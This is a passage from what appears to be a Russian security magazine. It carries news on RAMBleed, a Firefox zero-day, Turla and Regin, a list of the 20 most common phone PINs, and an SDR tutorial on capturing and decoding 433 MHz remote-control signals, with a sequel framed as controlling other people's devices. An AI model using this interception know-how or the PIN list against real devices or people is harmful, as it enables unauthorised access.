  вание RAMBleed (CVE‐2019‐0174), и от предыдущих версий ее отличает опас‐
  ная особенность: атаку можно использовать для кражи данных с целевого
  устройства, а не только для изменения существу ющих данных или повышения
  привилегий.
    Напомню, что оригинальную атаку Rowhammer еще в 2014 году придумали
  исследователи из университета Карнеги — Меллона. Ее суть сводилась
   к тому, что в результате определен ного воз действия на ячей ки памяти элек‐
  тромагнитное излучение может повлиять на соседние ячейки и значения
  битов в них изменятся.
     За прошедшие с тех пор годы исследова тели успели доказать, что
  перед Rowhammer может быть уяз вима память DDR3 и DDR4, а также атаку
  научились эксплуатировать через JavaScript и успели приспособить против
   Microsoft Edge и виртуальных машин  Linux. Существует даже вариация
  Rowhammer,  представляющая  опасность  для  устройств  на  Android,
  а эффективность атак научились повышать при помощи видеокарт.
     Как уже было сказано выше, RAMBleed отличается от других — атака поз‐
  воляет похитить информацию из RAM, перенеся данные из защищенной
  области памяти в ячейки, дос тупные с обычными пра вами.
     Чтобы добиться этого, специалисты использовали комбинацию сразу нес‐
   кольких проблем и техник, включая: зло употребление buddy allocator в Linux;
  создание механизма Frame Feng Shui, который помещает страницы прог‐
  раммы‐жертвы в нужную область памяти; создание нового метода упорядо‐
  чивания данных в памяти и «простукивания» (row hammering) рядов для опре‐
  деления того, какие именно данные рас положены в соседних ячейках.





  Интересно и то, что от RAMBleed не спасает даже ECC‐защита. Напомню, что
  ECC‐память автоматичес ки распозна ет и исправляет спонтанно воз никшие
  изменения (ошибки)  битов, то есть защища ет от различных вариаций
  Rowhammer. Нужно ска зать, что исходно ECC‐память создавалась не как
  защита от Rowhammer. В 1990‐е годы ее разработ чиков больше волновало
  возможное влияние на биты альфа‐час тиц, нейтронов и подобного. Однако
  до недавнего времени считалось, что от атак Rowhammer ECC защищает
   ничуть не хуже.
    Иссле дователи поясняют: в случае использования RAMBleed атакующему
  достаточно знать, что бит на стра нице перевернулся, а потом был исправлен.
  Злоумышленник все равно может узнать, какие биты были исправлены, опре‐
  делить значение, из которого или к которому они были исправлены, и все
   это никак не помешает проведению атаки.
     Эксперты уже уведомили о новом векторе Rowhammer‐атак инженеров In‐
    tel, AMD, OpenSSH, Microsoft, Apple и Red Hat. Хотя DDR3 и DDR4 уяз вимы
  перед новой атакой, специалис ты все же советуют пользовате лям выбирать
  DDR4 с TRR, так как эксплуатировать проб лему в таком случае становится
  весьма трудно.


  КРУПНОЕ ОБНОВЛЕНИЕ VLC

   Релиз VLC 3.0.7 стал самым крупным обновлением безопас ности за всю историю популярного
   плеера. И все благодаря программе поиска уязвимос тей Free and Open Source Software Audit
   (FOSSA), которую спонсируют власти ЕС.


   Глава VideoLan и один из ведущих разработчиков VLC Media Player Жан‐Батист Кемпф (Jean‐
   Baptiste Kempf) рассказал, что благодаря работе исследователей и выплатам FOSSA релиз VLC
   3.0.7 получился особенным.

  В общей сложности в этом выпуске было исправлено 33 уязвимости. Две проблемы получи ли
   статус высокоопасных, 21 баг оценивается как средний, и еще 20 уязвимостей считают ся
   малоопасными.


   Наиболее результативным из всех исследователей стал поль зователь под ником ele7enxxh,
   который нашел в популярном плеере сразу 13 багов на общую сум му 13 265 долларов.





                                        Продолжение статьи →
← Начало статьи





 ОПАСНЫЕ ДЫРЫ
 FIREFOX
  В двадцатых числах июня инженеры Mozilla выпустили обновленные версии
   Firefox 67.0.3 и Firefox ESR 60.7.1, устранив в бра узере уязвимость нулевого
  дня CVE‐2019‐11707, которая уже находилась под атаками. Баг получил статус
  критического, так как позволял выполнить про извольный код на машинах
  с уязвимыми версиями  Firefox. Уяз вимость была обнаружена экспертом
  Google Project Zero Сэмюэлем Гроссом и командой Coinbase Security.
    Но вскоре выяснилось, что уязвимос тей было сразу две, их объ единили
  и использовали для атак на сотрудников Coinbase, а не на простых поль‐
  зователей.
    Специалист по безопас ности Coinbase Филип Мартин (Philip Martin) рас‐
   сказал в Twitter, что 17 июня инженеры Coinbase обнаружили и блокировали
  попытку атаки на своих сотрудников. Неизвес тные злоумышленники прибегли
   к упомянутой 0day‐уязвимос ти в Firefox в сочетании с еще одной проблемой
  нулевого дня, позволявшей осу ществить побег из песочницы.
    Интересно, что специалист Google Project Zero Сэмюэль Гросс исходно
  обнаружил уязвимость CVE‐2019‐11707 еще 15 апре ля 2019 года, о чем
  и поспешил уве домить разработ чиков через Bugzilla. Как Гросс объяснил
   теперь,  уязвимость поз воляла уда лен ному  ата кующему выполнить про‐
  извольный код в браузере жертвы, но для дальнейшего раз вития атаки тре‐
  бовалась еще одна уязвимость, позволя ющая сбежать из песочницы и запус‐
   тить код на уровне ОС.
    Не совсем ясно, каким образом атаковавшие Coinbase злоумышленники
   узнали об этой RCE‐уязвимос ти и успели вос пользоваться ей до выхода пат‐
   чей. Здесь возможно нес колько сценариев:
   • атакующие обнаружили ту же самую уяз вимость самос тоятельно;
   • атакующие получили дос туп к багтрекеру Mozilla;
   • атакующие взло мали учетную запись сотрудника Mozilla и получи ли доступ
      к нужному разделу Bugzilla;
   • атакующие взло мали сам портал Bugzilla (подобное уже случалось).

  В Coinbase подчеркнули, что замеченные ата ки не были направле ны против
  пользователей, однако эксперты опа саются, что дру гие организации, так
  или иначе связанные с криптовалютами, тоже могут стать мишенями данной
  преступной группы.
      Так, по словам Филипа Мартина, злоумышленни ки могут распространять
  фишинговые письма, заманивая своих жертв на специальные веб‐страницы.
  Если жертва исполь зует Firefox, такая стра ница будет способна похитить
  пароли из браузера и другие данные. Подчеркивает ся, что атаки нацелены
  на пользователей как Mac, так и Windows и для каждой ОС используется раз‐
  ная мал варь.
     Изучив индикаторы ком прометации, обна родованные Мартином, Ник Карр
   (Nick Carr) из компании FireEye за метил, что те соответствуют активности,
  которую эксперты FireEye наблюдали в период между 2017 и 2019 годами.
   Тогда атаки тоже были направлены на финансовые учреждения и биржи крип‐
   товалют.
    В свою очередь, эксперт по безопасности macOS Патрик Вордл (Patrick
   Wardle) уже опубликовал детальный анализ вредоноса, предназначенного
  для Mac и распространявшегося с помощью проб лемы CVE‐2019‐11707.
  Вордл получил образец по почте от человека, который утверждал, что его
  полностью обновлен ный Mac подвергся атаке через уязвимость в Firefox.
  Причем пострадавший писал, что до недавнего времени он был связан
  с обменом криптовалюты.
    Иссле дователь отмечает, что изу ченная им малварь весьма похожа
  на старый вредонос OSX.Netwire (Wirenet), предназначенный для хищения
  паролей из Linux и OS X. Это может озна чать, что за созданием вредоносов
   стоит один и тот же человек или группа злоумыш ленников. Хуже того, Вордл
  обнаружил,  что  новой  малвари  удается  обмануть  защиту  XProtect
  и Gatekeeper.
    Еще один анализ был опубликован независимым ИБ‐экспертом Виталием
  Кремезом (Vitali Kremez), который про анализировал обе полезные нагрузки
   (для macOS и Windows), распространявшиеся с помощью экс плоита для Fire‐
   fox. Исследователь обнаружил в свежих атаках некоторые параллели с экс‐
   плуатацией уязвимости нулево го дня WinRAR, что была найдена и исправлена
  весной текущего года.


 МАЛВАРЬ ПОД ВИДОМ ИГР
   Аналитики «Лаборатории Касперского» собрали статис тику о вредонос ных кампаниях, нацелен‐
   ных на геймеров. Как ока залось, с мая по осен ний период обычно наблюдается всплеск
  фишинговой активности через ведущие игровые платформы.


  Фишинговые атаки, нацелен ные на геймеров, обычно связаны с крупными игровыми плат‐
   формами и издательскими брен дами. Так, фишеры часто подделывают бренды EA Origin,
   Blizzard Battle.net и Steam.

   Если в 2018 году на игроков совершались примерно по 500 атак в день, то после 16 нояб‐
   ря 2018 года ежедневные цифры регулярно достигают 1500 и 2000 атак.

  В случае EA (Electronic Arts) пиковое количество ежедневных атак на пользователей уве личи‐
   лось примерно на треть по сравнению с 2018 годом.

   Пользователей Steam атакуют еще чаще. Во второй половине 2018 года эксперты фиксировали
   более 1000 атак в сутки, а к 2019 году это число возросло до 2000 атак в день.

  В 2019 году рекордное количес тво атакован ных за один день пользовате лей Steam составило
  6383 человека, тогда как максимум 2018 года равнялся 4157.

  С июня 2018 года по июнь 2019 года 932 464 пользователя пос традали от атак, направленных
   на распространение вредоносных программ под видом пиратских игр.

   Лидером в списке таких злоупотреблений стал Minecraft. Вредоносные прог раммы, замас‐
   кированные под эту игру, составляют около 30% от общего числа, и они зат ронули более
   310 000 пользователей.

   На втором и третьем местах оказались GTA 5 (более 112 000 пользовате лей) и Sims
   4 с 105 000 пострадавших.

   Отлично работает и схема распространения малвари под видом еще не вышедших игр. Так,
  80% таких вредоносных программ прятались под мас ками фейковых FIFA 20, Elder Scrolls
  6 и Borderlands 3.





 ЖАБЫ ПРОТИВ
 ГАДЮК
  Эксперты  Symantec  зафиксирова ли  интересный  слу чай:  русскоязычная
   хакерская группа Turla (она же Waterbug, Snake, WhiteBear, VENOMOUS BEAR
  и Kypton), известная ИБ‐специалис там уже давно, взломала другую небезыз‐
  вестную хак‐группу, иранскую APT34 (она же Oilrig, HelixKitten и Crambus).
    Напомню,   что  первое  официальное  упоминание   Turla  датиро‐
  вано 2008 годом и связано со взло мом Министерства обороны США. Кроме
   того, ИБ‐специалисты об наруживали следы Turla в атаках 20‐летней дав‐
   ности. Впоследствии  с  группой  связыва ли многочисленные инциденты
  информационной  безопасности —  захват  спутниковых  каналов  связи
  для маскировки своей деятельнос ти, ата ки на органы государственного
  управления и стратегические отрасли, включая обо ронную промышленность.
     Последние восемнадцать месяцев эксперты Symantec наблюдали за тре‐
  мя  кампаниями  Turla  (Symantec  называ ет  группировку  Waterbug).  Так,
  с начала 2018 года Turla ата кова ла тринадцать организаций в десяти раз‐
  личных странах, включая министерства иностранных дел в странах Латинской
  Америки, Ближнего Вос тока и Европы, министерс тво внутренних дел в Южной
   Азии, две правительственные орга низации на Ближнем Востоке и в Юго‐Вос‐
  точной Азии, а также правительственное учреждение неназванной страны
   в Южной Азии, базирующееся в другой стра не.





  В одном из этих случаев ана литики обнаружили доказательства того, что
   в ноябре 2017 года Turla взло мала инфраструктуру иранской APT34. В итоге
  серверы «конкурентов» использовались для рас пространения малвари среди
  систем, ранее зараженных вредоно сами Oilrig.
      Так, первое свидетельство активности  Turla было замечено 11 янва‐
  ря 2018 года, когда инс трумент Turla (планировщик задач msfgi.exe) был заг‐
  ружен на компьютер в сети жертвы. На следующий день, 12 января 2018 года,
   Turla вновь исполь зовала сеть APT34, заг рузив дополнительную малварь
  на другие компьюте ры, ранее скомпрометированные APT34, рас пространяя
  инструмент для кражи учетных данных Mimikatz. По информации Symantec,
  целью группировки стали влас ти неназванной страны Ближнего Востока.





  При этом исследователи отмечают, что Oilrig, похоже, никак не отреагировали
  на взлом своей инфраструктуры, хотя иранская APT оставалась активной
   в сети правительственного учреждения до конца 2018 года, используя
  для этого другую управляющую инфраструктуру. При этом присутствие Turla
   в той же сети тоже сох ранялось как минимум до сентября 2018 года.


  САМЫЕ ПЛОХИЕ PIN‐КОДЫ

   Аналитики компании Splunk опубликовали список PIN‐кодов, которые чаще все го используют
   для защиты смартфонов. Экспер ты предупреждают, что порядка 26% всех смартфонов можно
   взломать, используя составленный ими список PIN‐кодов, и про сят пользовате лей ответствен‐
   нее подходить к их выбору.


   Самым распространенным кодом для разблокировки и подтвержде ния действий на смартфоне
   оказался 1234. За ним следуют 1111, 0000 и 1212. Процент их использования составляет 11%,
  6%, 2% и 1%.
   Полный список топ‐20 выглядит следующим образом:

     ‐‐‐‐

     1234

     1111

    0000

     1212

    7777

     1004

    2000

    4444

    2222

    6969

    9999

    3333

    5555

    6666

     1122

     1313

    8888

     4321

     2001

     1010





 ЗАПАДНЫЕ
 СПЕЦСЛУЖБЫ
 ВЗЛОМАЛИ ЯНДЕКС
  Журналисты Reuters опуб ликовали экс клюзивный материал, в котором ссы‐
  лаются на четыре собственных анонимных источника и рас сказывают о ком‐
  прометации компании Яндекс, произошедшей осенью 2018 года.
    По данным Reuters, в октябре‐нояб ре 2018 года компания Яндекс была
  заражена малварью Regin, извес тной ИБ‐экспертам с 2014 года. Напомню,
   что еще пять лет назад издание The Intercept про вело собс твенное рассле‐
  дование и пришло к выводу, что Regin исполь зовался разведывательными
   агентствами США и Великобритании.
     Теперь и источники Reuters акцентируют внимание на том, что этот вре‐
  донос используется предста вителями альянса Five Eyes, который объединяет
  спецслужбы Австралии, Канады, Новой Зеландии, США и Великобритании.
  Но точно определить, какая из пяти стран могла сто ять за атакой на Яндекс,
  по словам журналистов, не представляет ся воз можным. По данным источни‐
   ков агентства, хакеры тайно оставались в сети Яндекса в течение нес кольких
   недель.
    Сообщается, что неизвестные хакеры, похоже, были нацелены на шпи‐
  онаж, а не на кражу интеллектуальной собственности. Так, судя по всему, зло‐
  умышленники скомпрометировали R&D‐подразделение компании и искали
   техническую информацию,  связанную  с  механизмами  аутентификации,
  которые используются для пользователей Яндекса. Эти данные в даль‐
  нейшем могли помочь взломщикам выдать себя за пользователя Яндекса
  и получить доступ к личным сообщениям.
     Представите ли Яндекса уже отреагирова ли на публикацию Reuters и под‐
  твердили, что атака действительно имела место.


         «Яндекс, как и все круп ные интернет‑ком пании, регуляр но сталкива-
         ется с раз нообразны ми видами киберугроз. Наша кор поратив ная
         политика не под разуме вает рас простра нения под робной информа ции
        о подобных слу чаях.
         Эту попытку ата ки наши спе циалис ты своевре менно выявили и ней-
         тра лизовали в самом начале. Бла года ря чему попытка ата ки была
        пре дотвра щена до причине ния какого‑либо ущер ба. Можем заверить,
         что злоумыш ленники не смогли получить дос туп к данным пользовате-
        лей сер висов Яндекса», — гла сит пресс‑релиз ком пании.


  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Эксперты нашли ряд проблем в магазине игр Origin, разработан ном Electronic Arts. Баги угро‐
   жали 300 миллионам геймеров


   У малвари BrickerBot, намеренно калечившей IoT‐устройства, появился достойный пос ледова‐
   тель: Silex умышленно повреждает IoT‐устройства


   Когда социальная сеть MySpace была в зените славы, ее сотрудники сле дили за пользовате‐
   лями через инструмент Overlord


   Аудит выявил взлом НАСА через неавторизованный Raspberry Pi


   Миллионы компьютеров Dell под вергались риску из‐за бага в утилите SupportAssist


   Некоторые устройства YubiKey FIPS признаны ненадежными из‐за бага


   Chrome будет предуп реждать об опасных URL и обзаведется защит ным расширением Suspi‐
   cious Site Reporter


  В Microsoft Store продаются клоны бесплатных приложений с открытым кодом


   Иранские хакеры атакуют приложения для секвенирования ДНК


   Хакеры похитили записи группы Radiohead и требовали выкуп
COVERSTORY
  ЛОВИ
  СИГНАЛ!





 ИСПОЛЬЗУЕМ SDR, ЧТОБЫ ПЕРЕХВАТИТЬ
   И РАСШИФРОВАТЬ СИГНАЛ ПУЛЬТА





                                           DmitrySpb79
                                                    IoT/Python Developer
                                                 dmitryelj@gmail.com





Если при слове «радио» тебе вспо минается толь ко старый
дедушкин «Грюндиг» или «Океан», то это очень узкий взгляд
на вещи. Мы живем во вре мя беспро водных устройств,
интернета вещей, 5G и прочих интересных штук. Все больше
информации передается «по воздуху», поэтому хороший
специалист должен разбираться в радиопротоколах. Я рас‐
скажу, как принимать сигнал, где его искать и как анализи‐
ровать.


ЧТО ПЕРЕДАЕТСЯ ПО РАДИО
Для начала нужно понять, что и где можно най ти в радиоэфире. Список
обширный: от изоб ражений с метеоспутни ков до команд для атомных под‐
водных лодок.


             INFO

                       Купить  широкополосный  радиоприемник USB
                   можно на eBay всего лишь за 30 долларов с бес‐
                        платной почтовой доставкой. Ищи по словам RTL‐
                  SDR V3. Он позволяет принимать и записывать
                       практически любые радиосигналы в диапа зоне
                         от 24 до 1700 МГц, и этого более чем достаточно
                       для большинства экспериментов.


Еще в Первую мировую войну было извес тно, что переданные радиосигналы
могут быть приняты кем угодно. Так что все действительно важное переда‐
ется зашифрованным, и не стоит надеяться вклю чить радио и узнать секреты
Пентагона. Но кое‐что интересное найти все же можно.
  Пройдемся по частотам.
 • Сверхнизкие частоты до 30 кГц: связь с подводными лодками. Радиовол ны
   такой низкой частоты способны проникать даже в глубину оке ана, что,
   разуме ется, используется военными. Сис тема «Зевс» работает на час‐
   тоте 82  Гц, аналогичная американская сис тема Seafarer — на час‐
   тоте 76 Гц. Длина волны такой передачи сопоставима с радиусом Земли,
   а КПД антенны составляет тысячные доли процента. В нее нужно подать
   чуть ли не мегаватт, что бы на выходе получить один ватт. Чуть выше по час‐
   тоте, примерно на 14 кГц можно найти сигналы навигационной сис темы
   «Альфа». Принять эти сигналы может каждый, если поставить антенну
   на крышу или отъехать подальше от города, где нет помех. На YouTube
  можно найти видео энту зиастов.
 • На частоте 77 кГц переда ются сигналы точного времени из Германии.
  Система DCF77, наиболее популярная в Европе, позволяет синхронизи‐
   роваться настольным и даже некоторым наручным часам. Если на часах
   есть логотип Atomic Clock или Radio Controller, они могут принимать такой
   сигнал.
 • Длинные волны — 400 кГц — заняты сигналами так называемых ПРМ —
   приводных радиомаяков (в английской литературе NDB — non directional
   beacon). В каждом самолете есть ради окомпас, который показы вает нап‐
   равление на выбранный аэропорт.
 • На средних и коротких волнах (от 2 до 20 МГц) передаются мете опрогнозы
   для судов и метеофаксы, телеметрия разных устройств; работают военные
  модемы STANAG, загоризонтные радары и многое другое. Многое из это‐
   го можно принять на хороший коротковол новый приемник.
 • На так называемом диапазоне Си‐Би (Citizen Band) 27 МГц работают так‐
   систы и дальнобой щики.
 • На частотах от 30 до 40 МГц раньше работали домашние радиоте лефоны,
   сейчас их уже практически не осталось. Боль шая трубка с длинной
   антенной из старых филь мов — это оно. Вла дель цы обычно и не подоз‐
   ревали, что любой желающий может слышать их разговор, никакого шиф‐
   рования в этих телефо нах не было.
 • На частотах от 88 до 108 МГц зву чит всем известное FM‐радио. Радиоин‐
  женеры называют его WFM (Wide FM, в отличие от узкополосной FM пор‐
   тативных радиостанций). Чуть ниже переда вался так называемый совет‐
   ский УКВ, сейчас эти станции тоже практически вез де закрыты.
 • На частотах от 118 до 137 МГц работа ют ави аторы. Переговоры летчиков
   с диспетчерами и меж ду самолетами, например на воз душном параде,
   передаются в открытом и незашифрованном виде.
 • На частоте 137 МГц работают метеоспутни ки NOAA. Ты можешь принять их
   сигнал и декодировать картинку вида Земли из кос моса, только нужно
   знать время, когда спутник пролетает над твоей головой. Энту зиасты и тут
   преуспели и выложили это на YouTube.
 • На частотах в диапазоне 140–200 МГц и 400–500 МГц — разные службы
   и сервисы: ГИБДД, пожарные, скорая, лифтеры, гастарбай теры. Диапа‐
   зон 433 МГц выделен для портативных радиостанций, которые ты, воз‐
   можно, видел в продаже. Рядом по частоте работа ют и портативные ради‐
   оустройства, к которым мы еще вернемся.
 • Раньше на частоте 165 МГц работа ли пей джеры — устройства для при ема
   текстовых сооб щений, и все их сооб щения для абонентов передавались
   в открытом виде, доступном для декодирования. Сейчас в Рос сии пейдже‐
   ров вроде бы не осталось, а в Европе и США они живы до сих пор, ими
   пользуются пожарные, медики и прочие службы.
 • На частоте 255 МГц работа ют американские спутники связи SATCOM.
   Интересны они тем, что спутники старые и аналоговые и общаться через
   них, в принципе, может любой желающий, никаких паролей и аутентифика‐
   ции. Чем до сих пор поль зуются некоторые бразильские и мексиканские
  фермеры, которые прис пособили такие спутники вместо халявного ради‐
   отелефона. Нужна лишь радиостанция на этот диапазон и направленная
   антенна. Сделать это может каждый, но на территории России сигнал сла‐
   бый.
 • На частотах 865 МГц и 2,4 ГГц находится диапазон ISM (Industrial, Scientiﬁc,
   Medical). Там работают радиомо демы, устройства IoT и разные девайсы.
   Если ты хочешь передавать данные со сво ей Arduino без проводов — бери
   модуль на этот диапазон.
 • На частотах 900 и 1800 МГц работает сотовая связь.
 • На частоте 1090 МГц работает ADS‐B — транспондеры самоле тов, бла‐
   годаря которым ты можешь видеть пролетающие самолеты на сайте
   Flighradar24. И эти сигналы тоже мож но принимать и декодировать самос‐
   тоятельно.
 • На частоте 1575 МГц переда ются сигналы GPS, благодаря которым
   работает навигация в твоем смартфоне или автомобиле.
 • Еще выше по частоте (10 ГГц и более) работают спутники, радиоре лейные
   линии связи.

Экскурс вышел не очень кратким, но это было необходимо. Теперь пора
поговорить о том, что нам нуж но, что бы радиосигналы принимать и переда‐
вать.


ЖЕЛЕЗО
В радиотехнике, как и во мно гих жизненных областях, все зависит от бюд‐
жета. Примерно за 30 долларов мож но купить приемник RTL‐SDR V3, поз‐
воляющий принимать радиосигналы в диапазоне от 24 до 1700 МГц.





                           RTL‐SDR

В комплект входит антенна и мини‐штатив. Остерегайся подделок и не бери
совсем дешевые модели с AliExpress за десять баксов. Да, китайцы научились
уже подделывать сами себя.
  С этим приемником можно принимать сигналы авиадиапазона, FM‐радио,
портативных радиостанций, ADS‐B, некоторых модемов. Но вот передавать
RTL‐SDR не может.
   Если ты хочешь не только принимать радиосигналы, но и передавать их,
тогда хороший выбор — это LimeSDR или LimeSDR Mini. Первый более фун‐
кциональный и дорогой, вто рой дешевле. Примерно за 200 или 400 дол ларов
ты получаешь устрой ство, способ ное и принимать, и передавать в диапазоне
от 10 МГц до 3,8 ГГц.





                         LimeSDR Mini

Устройство продается через кра удфандин говый сайт crowdsupply и не всегда
есть в наличии, так что лови момент. Кстати, этих LimeSDR авторы продали
на два миллиона дол ларов. Хорошие зна ния в электронике могут сделать
тебя не только умным, но и богатым!
  Отдельно хочу сказать о HackRF One. Этот девайс позволя ет передавать
и принимать на частотах от 1 МГц до 6 ГГц.





                            HackRF

Устройство, в прин ципе, неп лохое, но морально уста рело, имеет лишь вось‐
мибитный ЦАП и АЦП и не может одновременно принимать и передавать,
а это иногда важно. Поэтому, нес мотря на хакерское название, брать его я
не рекомендую — за те же 300–400 долларов можно взять более современ‐
ный девайс. Попадаются и дешевые китайские клоны, но их я не тестировал
и ничего сказать не могу.
   Есть и другие устрой ства (USRP, BladeRF, Airspy), но описанных выше
для наших задач достаточно. Так что делай заказ в интернет‐магазине на то,
что больше понравилось, а пока посылка идет почтой, можешь потратить вре‐
мя на теорию.


СОФТ
В этой части мы погово рим о приеме радиосигналов и их декодировании.
Для примера возьмем что‐нибудь попроще и подешевле, что есть дома
у многих, — беспроводной выключатель.





               Беспроводной выключатель на 433 МГц

Он хорош тем, что его сигнал прос той и понятный, для его анализа дос таточ‐
но даже редактора Paint. Нам понадобится толь ко приемник (будет достаточ‐
но RTL‐SDR) и бесплатная программа SDR#.


Виды модуляции
Для начала разберемся, как вообще сигналы передаются по радио. Здесь
есть несколько возможных вариантов.
  Амплитуд ная модуляция (АМ — Amplitude Modulation). Здесь амплитуда
передатчика модулируется нужным нам сигналом. Это как раз то, что ты изу‐
чал в школе на физике в разделе «детекторный приемник». Плюс схемы —
в ее простоте, и в простых устройствах она до сих пор активно используется.
На спектре ее легко отличить по характерному виду — по симметрии отно‐
сительно центра.
  Частотная модуляция (FM — Frequency Modulation). Здесь модулируется
не амплитуда, а частота. Использует ся в портативных радиостанциях, ради‐
онянях и во всем им подоб ном.
  Фазовая модуляция, QAM, OFDM — используется в модемах, цифровых
видах связи для передачи голоса или данных. Если ты видишь на спектре
широкий сигнал, это оно.
  В нашем случае все просто. Дешевые китай ские пульты используют
амплитудную модуляцию в ее самом простейшем цифровом формате,
называемом OOK — On‐Oﬀ Keying.


Запись
Для начала внимательно смотрим на пульт. В моем случае на задней стороне
пульта было написано Made in China и Frequency 433.92MHz. Это облегчает
нам задачу. Хотя даже если бы это не было написа но, частоту легко найти —
ширина полосы RTL‐SDR сос тавляет 2 МГц, и такие сигналы на экране SDR#
хорошо видно.
  В моем случае реальная час тота оказалась 434 МГц — видимо, ±100 кГц
для китайской техники не пог решность. Сам сиг нал должен быть хорошо
виден, если поднести пульт к антенне и нажать кнопку.





                          Сиг нал в SDR#

Осталось его записать. Запус каем SDR#, настраиваемся на частоту, выбира‐
ем модуляцию AM, включаем запись, подносим пульт к антенне приемника
и нажимаем на нем под ряд все кноп ки. На выходе мы дол жны получить файл
WAV, который мы и будем ана лизировать.


АНАЛИЗ
Формат On‐Oﬀ Keying — очень простой бинарный формат, и никаких серь‐
езных инструментов для работы с ним нам не пот ребуется. Просто открываем
файл в любом аудиоредакторе, я использовал Cool Edit.
  SDR# почему‐то пишет WAV в формате стерео, хотя АМ не может быть сте‐
рео. В том же Cool Edit я сконвертировал «звук» в моно.





     Если все было сделано пра вильно, мы увидим подобную картинку

Можно обойтись и без Cool Edit, если у тебя его нет или если ты принципи‐
ально против использования взломанного ПО. Вывести файл WAV можно
с помощью Python и библиотек для научной обработки и визуализации дан‐
ных NumPy, SciPy и Matplotlib.
   Чтобы код зарабо тал, нужно уста новить Python 3 или 2.7 и библиоте ки
Matplotlib, NumPy и SciPy, а после ввести следующую команду:
 • в Windows:


> C:\Python3\Scripts\pip.exe install numpy scipy matplotlib

 • в Linux:


$ sudo pip install numpy scipy matplotlib

Код самой программы:


import scipy.io.wavfile
import numpy as np
import matplotlib.pyplot as plt


rate, data = scipy.io.wavfile.read('recording.wav')
data_left = data[:, ‐1]


plt.figure(1)
time = np.linspace(0, len(data_left)/rate, num=len(data_left))
plt.plot(time, data_left)
plt.tight_layout()
plt.show()

Запустив программу в консоли, увидим такую картинку.





                       Запись в Matplotlib

Идем дальше и пытаемся понять, что же тут изображено. На моем пульте
десять кнопок, десять больших бло ков — это мои десять нажатий. Увеличи‐
ваем первый блок и видим, что он сос тоит из одинаковых фрагментов,
которые пов торяются каждые 0,08 с. Все прос то: 0,08 с — это длительность
одной посылки, и, пока ты держишь кноп ку нажатой, она цикличес ки повторя‐
ется.





                Повторяющаяся пос ледовательность

Теперь увеличиваем блок еще больше и смотрим на каждую последователь‐
ность. В качестве примера возь мем части из последовательностей для пер‐
вой и второй кнопок и выведем их рядом с помощью Paint.





Это самый обыч ный двоичный код. Пик — это единица, его отсутствие —
ноль. Хорошо видно, что две кноп ки отличаются дву мя битами. Таким обра‐
зом, пульт просто посыла ет длинную дво ичную пос ледовательность, соот‐
ветствующую нажатой кнопке. Можно убедиться в этом, нажимая остальные
кнопки и наблюдая другие последовательнос ти.
  Длина последовательности обус ловлена многообразием и количес твом
устройств. Последовательность сделана такой длинной, чтобы вероятность
совпадения кодов была небольшой.
  По этому принципу работает мно жес тво девайсов — беспроводные пуль‐
ты, метеостанции, датчики давления в шинах. Дешево и сердито, устройство
практически не требует питания, такой дат чик в метеостанции, например,
может работать год от двух батареек. Но минус тут тоже оче виден — полное
отсутствие какой‐либо защиты, все переда ется в откры том виде. Зачастую
это не критично, но такой пульт на дверь гаража я бы все же вешать не стал.
  Используя дешевые беспро водные пульты, знай, что их данные представ‐
ляют собой простой дво ичный код и никак не защищены ни от прослушива‐
ния, ни от передачи. Если безопасность критична, используй более дорогие
устройства, например на базе Z‐Wave или Philips Hue.
   Тебе наверняка было бы лень считать биты на картинке, чтобы узнать,
какая кнопка была нажата. И ты не одинок — умные люди уже написали прог‐
рамму анализа сигналов на час тоте 433 МГц для приемника RTL‐SDR,
которая так и называется — rtl_433. Ты можешь ска чать ее на GitHub или най‐
ти в интернете в формате .exe. В эту программу заложе на большая база раз‐
ных устройств, так что, запустив ее, ты уви дишь все в понятном виде.
  Запускаем программу из командной стро ки командой rtl_433.exe ‐G
и получаем значения всех дат чиков, которые доступны поблизости.





                  Вывод прог раммы rtl_433

Так я узнал температуру и влаж ность воз духа от некоего Nexus, скорость
и направление ветра от Wind Sensor. Список дат чиков, которые поддержи‐
ваются программой, большой, прог рамма кросс‐платформенная и может
работать на Windows, OS X, Linux и даже на Raspberry Pi.
   Если идея передачи данных без про водов тебе понравилась, ты можешь
купить недорогой ради омодуль для Arduino на eBay или AliExpress. Найти его
несложно — ищи по словам Arduino 433MHz, цена такого модуля примерно
один доллар за штуку.
   Когда будешь использовать такой модем, помни: вре мя передачи не дол‐
жно превышать 1% от общего времени (так называемый параметр duty cycle).
Частота одна для всех, и нуж но дать время дру гим устройствам передать
свои данные.
  Сегодня мы научились только принимать и анализировать радиосигнал.
О том, как передавать данные и управлять устройствами при помощи
передатчика SDR, я рас ска жу в другой раз. Надеюсь, я зас тавил тебя
по‐новому посмотреть на радио!
COVERSTORY

 ЛОВИ СИГНАЛ!
     УЧИМСЯ ПЕРЕДАВАТЬ СИГНАЛ
    И УПРАВЛЯТЬ ЧУЖОЙ ТЕХНИКОЙ





                                           DmitrySpb79
                                                    IoT/Python Developer
                                                 dmitryelj@gmail.com





Представим, что ты поймал, перех ватил и расшифровал сиг‐
нал управления каким‐то устройством. Теперь настала пора
его подделать! А для этого нужно научиться передавать
любые сигналы. Готовим радиопе редатчик — и вперед
к победе!


ЖЕЛЕЗО
В качестве примера будем рас сматривать сигналы от пульта, работающе го
на частоте 434 МГц.





                       Беспроводной пульт

Такой пульт для наших целей хорош по двум при чинам:
 1. Его сигнал очень прост для изучения и представляет собой модулирован‐
  ный нужной частотой бинарный код (так называемая модуляция OOK —
  On‐Oﬀ Keying).
 2. По такому прин ципу работают многие устрой ства, так что, разобравшись
   с одним, нетрудно управлять и дру гими.

Для приема сигнала мы пользовались дешевым приемником RTL SDR V3,
купить который можно за 30 долларов. Он хорош для приема и анализа сиг‐
налов, но вот передавать, увы, RTL SDR не умеет. Тут нам пригодится
что‐нибудь более функциональное, нап ример LimeSDR или HackRF.


             INFO

                     Подробнее об этом я писал в статье «Лови сиг‐
                          нал! Используем SDR, что бы перехватить и рас‐
                   шифровать сигнал пульта».



СОФТ
Главное отличие Software Deﬁned Radio от радио обычного в том, что вся
обработка сигнала выполняется в «цифре». Задача самого устройства сво‐
дится к тому, чтобы передать цифровой поток на ЦАП, который транслирует
все в эфир. Скорость оцифровки и ширина полосы пропускания связаны те‐
оремой Шеннона — Котельникова: чем боль ше чис ло отсче тов в секунду, тем
более широкополосный сигнал можно передать.
  Скорости современных ЦАП и АЦП таковы, что SDR может записы вать
одновременно весь эфир FM в диапа зоне от 88 до 108 МГц целиком.
Или передавать сразу несколько сигналов одновременно на раз ных час‐
